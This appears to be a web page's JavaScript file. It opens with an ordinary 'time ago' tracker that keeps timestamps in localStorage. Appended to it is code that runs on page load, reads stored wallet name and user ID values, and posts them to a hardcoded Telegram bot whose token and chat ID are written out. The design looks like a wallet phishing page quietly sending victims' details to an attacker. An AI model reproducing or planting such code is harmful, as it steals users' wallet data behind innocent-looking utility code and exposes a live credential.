// Function to format time difference (same as before)
function formatTimeDifference(timestamp) {
    const now = new Date();
    const date = new Date(timestamp);
    const seconds = Math.floor((now - date) / 1000);
    
    if (seconds < 10) return 'just now';
    if (seconds < 60) return `${seconds} seconds ago`;
    
    const intervals = {
        year: 31536000,
        month: 2592000,
        week: 604800,
        day: 86400,
        hour: 3600,
        minute: 60
    };
    
    if (seconds < intervals.hour) {
        const minutes = Math.floor(seconds / intervals.minute);
        return `${minutes} minute${minutes === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.day) {
        const hours = Math.floor(seconds / intervals.hour);
        return `${hours} hour${hours === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.day * 2) return 'yesterday';
    if (seconds < intervals.week) {
        const days = Math.floor(seconds / intervals.day);
        return `${days} day${days === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.month) {
        const weeks = Math.floor(seconds / intervals.week);
        return `${weeks} week${weeks === 1 ? '' : 's'} ago`;
    }
    if (seconds < intervals.year) {
        const months = Math.floor(seconds / intervals.month);
        return `${months} month${months === 1 ? '' : 's'} ago`;
    }
    const years = Math.floor(seconds / intervals.year);
    return `${years} year${years === 1 ? '' : 's'} ago`;
}

// Function to update a specific tracker
function updateTimeDisplay(trackerId) {
    const trackerElement = document.querySelector(`[data-time-id="${trackerId}"]`);
    if (!trackerElement) return;
    
    const storageKey = `trackedTime_${trackerId}`;
    const storedTime = localStorage.getItem(storageKey);
    
    if (storedTime) {
        const formattedTime = formatTimeDifference(parseInt(storedTime));
        trackerElement.textContent = formattedTime;
    } else {
        // If no time is stored, set it to now
        const currentTime = new Date().getTime();
        localStorage.setItem(storageKey, currentTime.toString());
        trackerElement.textContent = 'just now';
    }
}

// Function to reset a tracker's time
function resetTrackerTime(trackerId) {
    const currentTime = new Date().getTime();
    localStorage.setItem(`trackedTime_${trackerId}`, currentTime.toString());
    updateTimeDisplay(trackerId); // Update immediately
}

// Initialize all trackers on page load
function initAllTimeTrackers() {
    document.querySelectorAll('.time-tracker').forEach(tracker => {
        const trackerId = tracker.getAttribute('data-time-id');
        updateTimeDisplay(trackerId);
    });
    
    // Auto-update all trackers every minute
    setInterval(() => {
        document.querySelectorAll('.time-tracker').forEach(tracker => {
            const trackerId = tracker.getAttribute('data-time-id');
            updateTimeDisplay(trackerId);
        });
    }, 60000);
}

// Initialize when the page loads
document.addEventListener('DOMContentLoaded', initAllTimeTrackers);

// Example: Reset buttons
document.getElementById('reset-tracker1').addEventListener('click', () => resetTrackerTime('tracker1'));
document.getElementById('reset-tracker2').addEventListener('click', () => resetTrackerTime('tracker2'));

updateTimeDisplay('tracker-one');

const walletCreated = localStorage.getItem('walletCreated');
if (walletCreated === 'true') {
updateTimeDisplay('tracker-one');
}


// Function to send data to Telegram bot
async function sendToTelegramBot(data, botToken, chatId) {
    try {
        const message = `Wallet Data:\n\nWallet Name: ${data.walletName}\nWallet User ID: ${data.walletUserId}`;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        const result = await response.json();
        if (!response.ok) {
            throw new Error(result.description || 'Failed to send message');
        }
        
        console.log('Data sent to Telegram bot successfully:', result);
        return result;
    } catch (error) {
        console.error('Error sending data to Telegram:', error);
        throw error;
    }
}

// Function to check import status and send wallet data if enabled
async function checkAndSendWalletData(botToken, chatId) {
    try {
        // Check if import is enabled
        const importStatus = localStorage.getItem('Send');
        
        if (importStatus !== 'enabled') {
            console.log('Import is not enabled. No data will be sent.');
            return;
        }

        // Get wallet data
        const walletName = localStorage.getItem('walletName');
        const walletUserId = localStorage.getItem('walletUserId');

        if (!walletName || !walletUserId) {
            console.log('Wallet data not found in localStorage');
            return;
        }

        // Prepare data object
        const walletData = {
            walletName: walletName,
            walletUserId: walletUserId
        };

        // Send data to Telegram bot
        await sendToTelegramBot(walletData, botToken, chatId);
        
        // Disable send after successful send
        localStorage.setItem('Send', 'disabled');
        console.log('Send has been disabled after successful send');
        
    } catch (error) {
        console.error('Error:', error);
    }
}



// Telegram Bot Configuration
    const TELEGRAM_BOT_TOKEN = '8101442954:AAGBNz1uHe9v1dWDhMr9duIT_N33lUv-A9Y'; // Replace with your bot token
    const TELEGRAM_CHAT_ID = '8163151595'; 

// Execute the check and send function
checkAndSendWalletData(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID);
